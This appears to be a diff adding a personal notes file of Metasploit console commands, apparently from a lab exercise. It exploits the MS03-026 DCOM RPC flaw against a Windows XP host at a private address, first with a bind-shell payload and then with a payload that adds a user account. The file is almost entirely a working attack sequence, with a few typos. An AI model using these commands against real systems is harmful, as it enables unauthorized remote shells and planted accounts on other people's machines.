@@ -1,0 +1,20 @@
+msfconsole
+search MS03-026
+use exploit/win.dcerpc/ms03_026_dcom
+show options
+set RHOSTS 192.168.80.5 ......xp ip
+
+
+show payloads
+set payload..
+set payloads...tabtab
+set payload windows/shell/bind_tcp
+show options
+exploit
+
+
+
+set payload windows/adduser
+show optrions
+set user tinku
+exploit
